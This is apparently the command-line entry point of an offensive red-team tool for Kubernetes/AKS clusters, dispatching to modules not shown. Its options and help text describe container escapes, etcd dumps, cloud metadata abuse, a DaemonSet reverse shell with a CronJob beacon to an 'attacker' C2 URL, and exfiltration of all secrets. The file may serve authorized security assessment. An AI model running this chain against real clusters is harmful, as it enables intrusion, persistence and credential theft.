import sys
import argparse
import json
from pathlib import Path

from utils import print_header, print_good, print_logo
import api_enum
import phases

OUT = Path("aks_red_team_output")
OUT.mkdir(exist_ok=True)
CSV_FILE = OUT / "aks_recon_output.csv"
JSON_LOG = OUT / "results.json"

def main():
    print_logo()
    parser = argparse.ArgumentParser(
        description="""

    """
    , formatter_class=argparse.RawTextHelpFormatter)

    # === PHASES/CHAIN OPTIONS ===
    parser.add_argument("--phase", choices=[
        "prep", "recon", "misconfig", "kubelet", "escape", "etcd", "secrets", "cloud", "supply",
        "network", "persist", "exfil", "cleanup"
    ], help="""
    Run a specific attack/abuse phase from the red team chain:
    prep       - Print current context, cluster info
    recon      - Full cluster reconnaissance (all kubectl recon)
    misconfig  - Test and exploit RBAC & cluster misconfigurations
    kubelet    - Scan for unauthenticated Kubelet endpoints
    escape     - Deploy privileged/hostPath pods for container escapes
    etcd       - Locate etcd and sample key dump (requires access)
    secrets    - Enumerate secrets, configmaps, SA tokens
    cloud      - Attempt Azure/AWS metadata (IMDS) abuse
    supply     - Detect supply chain/CI pipeline YAMLs
    network    - Enumerate networkpolicies and exposed services
    persist    - Deploy DaemonSet reverse shell + CronJob beacon
    exfil      - Exfiltrate all secrets, create etcd snapshot
    cleanup    - Clean up all red team artifacts from cluster
    """)
    parser.add_argument("--all", action="store_true", help="Run all default attack chain phases (recommended for complete assessment)")
    parser.add_argument("--all-extended", action="store_true", help="Run all phases (default + extended modules)")
    parser.add_argument("--fast", action="store_true", help="Run only critical base phases for rapid assessment")

    # === PERSISTENCE/REVERSE SHELL ===
    parser.add_argument("--lhost", default="127.0.0.1", help="Attacker's IP for reverse shell (default: 127.0.0.1)")
    parser.add_argument("--lport", default=4444, type=int, help="Attacker's port for reverse shell (default: 4444)")
    parser.add_argument("--c2-beacon", default="http://attacker/beacon", help="URL for persistence beacon (used by CronJob)")

    # === ENUMERATION / RECONNAISSANCE ===
    parser.add_argument("--namespace", metavar="NAMESPACE", help="Restrict enumeration to the specified namespace only")
    parser.add_argument("--csv", action='store_true', help="Write all API-based recon output to a CSV file for reporting")

    parser.add_argument("--list-namespaces", action='store_true', help="List all namespaces in the cluster")
    parser.add_argument("--nodes", action='store_true', help="Enumerate all nodes in the cluster")
    parser.add_argument("--pods", action='store_true', help="List all pods (optionally filter by --namespace)")
    parser.add_argument("--services", action='store_true', help="List all Kubernetes services")
    parser.add_argument("--serviceaccounts", action='store_true', help="List all service accounts in the cluster/namespace")
    parser.add_argument("--secrets", action='store_true', help="List all secrets (with suspicious key highlighting)")
    parser.add_argument("--configmaps", action='store_true', help="List all configmaps (with suspicious key highlighting)")
    parser.add_argument("--rbac", action='store_true', help="List RBAC roles, rolebindings, clusterroles, clusterrolebindings")
    parser.add_argument("--can-i", action='store_true', help="Check and print allowed verbs/resources per namespace (RBAC can-i checks)")
    parser.add_argument("--daemonsets", action='store_true', help="List all DaemonSets")
    parser.add_argument("--deployments", action='store_true', help="List all Deployments")
    parser.add_argument("--pvcs", action='store_true', help="List all PersistentVolumeClaims")
    parser.add_argument("--networkpolicies", action='store_true', help="List all NetworkPolicies")
    parser.add_argument("--psp", action='store_true', help="List all PodSecurityPolicies (if enabled)")
    parser.add_argument("--azuremeta", action='store_true', help="Test if Azure/AWS metadata endpoint is accessible from the pod")
    parser.add_argument("--execpods", action='store_true', help="Exec into pods (with sensitive SAs) to run 'id' and check privileges")
    parser.add_argument("--cicd", action='store_true', help="Detect CI/CD pipeline-related secrets and configmaps")
    parser.add_argument("--ips", action='store_true', help="List node and pod IP addresses (for scanning/targeting)")
    parser.add_argument("--scan", action='store_true', help="Scan node/pod IPs for top common open ports (TCP only)")
    parser.add_argument("--detect", action='store_true', help="Detect running container/node services from pod specs")

    # === EXTENDED/ADVANCED MODULES ===
    parser.add_argument("--admission", action='store_true', help="Enumerate mutating/validating admission controllers and webhooks")
    parser.add_argument("--aggregation", action='store_true', help="Enumerate API aggregation layer and custom APIService objects")
    parser.add_argument("--quotas", action='store_true', help="List resource quotas per namespace")
    parser.add_argument("--service-mesh", action='store_true', help="Detect service mesh (istio/envoy/linkerd) sidecars in pods")
    parser.add_argument("--event-logs", action='store_true', help="List the 20 most recent cluster events")
    parser.add_argument("--dashboard", action='store_true', help="Detect exposed Kubernetes Dashboard services")
    parser.add_argument("--prometheus", action='store_true', help="Detect Prometheus/metrics endpoints in the cluster")
    parser.add_argument("--runtime-abuse", action='store_true', help="Detect pods mounting runtime sockets (docker.sock, containerd.sock)")
    parser.add_argument("--lateral-move", action='store_true', help="Analyze network and DNS policies for lateral movement")
    parser.add_argument("--cloud-priv-escalation", action='store_true', help="Attempt to obtain and escalate cloud provider (Azure/AWS) privileges")
    parser.add_argument("--cicd-pipeline-files", action='store_true', help="Scan for pipeline/workflow YAML files (CI/CD supply chain weaknesses)")
    parser.add_argument("--deploy-priv-pods", action='store_true', help="Deploy privileged/hostPath pods for escape and host compromise testing")
    parser.add_argument("--etcd-basic", action='store_true', help="Locate etcd pod and dump sample keys if possible")
    parser.add_argument("--exfil-secrets", action='store_true', help="Exfiltrate all secrets/etcd snapshot to disk")
    parser.add_argument("--cleanup", action='store_true', help="Remove all red team deployed artifacts (pods, roles, bindings, etc.)")

    args = parser.parse_args()

    # Get Kubernetes client if any recon phase requested
    need_api = any([
        args.nodes, args.pods, args.services, args.serviceaccounts, args.secrets, args.configmaps, args.rbac, args.can_i,
        args.daemonsets, args.deployments, args.pvcs, args.networkpolicies, args.psp, args.execpods, args.cicd,
        args.ips, args.scan, args.detect, args.list_namespaces
    ])

    # Extended/advanced discovery modules
    need_api |= any([
        args.admission, args.aggregation, args.quotas, args.service_mesh, args.event_logs, args.dashboard,
        args.prometheus, args.runtime_abuse, args.lateral_move, args.cloud_priv_escalation,
        args.cicd_pipeline_files, args.deploy_priv_pods, args.etcd_basic, args.exfil_secrets
    ])

    csvwriter = None
    csvfile = None
    if args.csv:
        csvfile = open(CSV_FILE, "w", newline='', encoding='utf-8')
        import csv as _csv
        csvwriter = _csv.writer(csvfile)

    # Set up clients and namespaces for enum modules
    if need_api:
        core, rbac, apps, net, psp = api_enum.get_kube_client()
        namespaces = api_enum.get_namespaces(core, args.namespace)

        # Standard enum modules
        if args.list_namespaces:
            api_enum.list_namespaces(core, csvwriter)
        if args.nodes:
            api_enum.list_nodes(core, csvwriter)
        if args.pods:
            api_enum.list_pods(core, namespaces, csvwriter)
        if args.services:
            api_enum.list_services(core, namespaces, csvwriter)
        if args.serviceaccounts:
            api_enum.list_service_accounts(core, namespaces, csvwriter)
        if args.secrets:
            api_enum.list_secrets(core, namespaces, csvwriter)
        if args.configmaps:
            api_enum.list_configmaps(core, namespaces, csvwriter)
        if args.rbac:
            api_enum.list_roles_bindings(rbac, namespaces, csvwriter)
        if args.can_i:
            api_enum.can_i_recon(namespaces, csvwriter)
        if args.daemonsets:
            api_enum.list_daemonsets(apps, namespaces, csvwriter)
        if args.deployments:
            api_enum.list_deployments(apps, namespaces, csvwriter)
        if args.pvcs:
            api_enum.list_pvcs(core, namespaces, csvwriter)
        if args.networkpolicies:
            api_enum.list_network_policies(net, namespaces, csvwriter)
        if args.psp:
            api_enum.list_pod_security_policies(psp, csvwriter)
        if args.azuremeta:
            api_enum.check_azure_metadata(csvwriter)
        if args.execpods:
            api_enum.exec_into_pod(core, namespaces, csvwriter)
        if args.cicd:
            api_enum.detect_cicd_secrets(core, namespaces, csvwriter)
        if args.ips:
            api_enum.list_ips(core, namespaces, csvwriter)
        if args.detect:
            api_enum.detect_pod_services(core, namespaces, csvwriter)
            api_enum.detect_node_services(core, csvwriter)
        if args.scan:
            api_enum.scan_node_pod_ports(core, namespaces, csvwriter)

        # Extended modules (these may not need csvwriter or client objects)
        if args.admission:
            api_enum.enumerate_mutating_webhooks()
        if args.aggregation:
            api_enum.enumerate_api_aggregation()
        if args.quotas:
            api_enum.enumerate_resource_quotas()
        if args.service_mesh:
            api_enum.detect_service_mesh_sidecars()
        if args.event_logs:
            api_enum.enumerate_k8s_events()
        if args.dashboard:
            api_enum.detect_k8s_dashboard()
        if args.prometheus:
            api_enum.detect_prometheus_metrics()
        if args.runtime_abuse:
            api_enum.detect_runtime_sockets()
        if args.lateral_move:
            api_enum.lateral_movement_surface()
        if args.cloud_priv_escalation:
            api_enum.azure_cloud_priv_escalation()
        if args.cicd_pipeline_files:
            api_enum.enumerate_cicd_pipeline_files()
        if args.deploy_priv_pods:
            api_enum.deploy_privileged_and_hostpath_pods()
        if args.etcd_basic:
            api_enum.etcd_pod_and_data()
        if args.exfil_secrets:
            api_enum.exfil_secrets_and_etcd()
        if args.cleanup:
            api_enum.cleanup_red_team_artifacts()

    # Red Assault phases
    PHASES = {
        "prep": phases.phase_prep,
        "recon": phases.phase_recon,
        "misconfig": lambda: phases.phase_misconfig_dynamic(phases.results.get("recon_outputs", {}), args.c2_beacon),
        "kubelet": phases.phase_kubelet,
        "escape": phases.phase_escape,
        "etcd": phases.phase_etcd,
        "secrets": phases.phase_secrets,
        "cloud": phases.phase_cloud,
        "supply": phases.phase_supply,
        "network": phases.phase_network,
        "persist": lambda: phases.phase_persist(args.lhost, args.lport, args.c2_beacon),
        "exfil": phases.phase_exfil,
        "cleanup": phases.phase_cleanup,
    }
    base_order = [
        "prep", "recon", "misconfig", "kubelet", "escape", "etcd",
        "secrets", "cloud", "supply", "network", "persist", "exfil"
    ]
    extended_order = [
        "admission", "aggregation", "quotas", "service-mesh", "event-logs",
        "dashboard", "prometheus", "runtime-abuse", "lateral-move", "cloud-priv-escalation"
    ]
    critical_base_order = ["prep", "recon", "misconfig", "escape", "persist"]

    # Run phases
    if args.all_extended:
        for phase in base_order:
            PHASES[phase]()
        # Extended are called above as API enum modules
    elif args.all:
        seq = critical_base_order if args.fast else base_order
        for phase in seq:
            PHASES[phase]()
    elif args.phase:
        PHASES[args.phase]()

    print_header("Recon Complete.")
    if csvfile:
        csvfile.close()
        print_good(f"\n[*] CSV output written to {CSV_FILE}")

    JSON_LOG.write_text(json.dumps({"completed": True, "args": vars(args)}, indent=2))
    print_good(f"✓ Engagement complete. Logs and outputs in '{OUT}/' directory.")

if __name__ == "__main__":
    main()
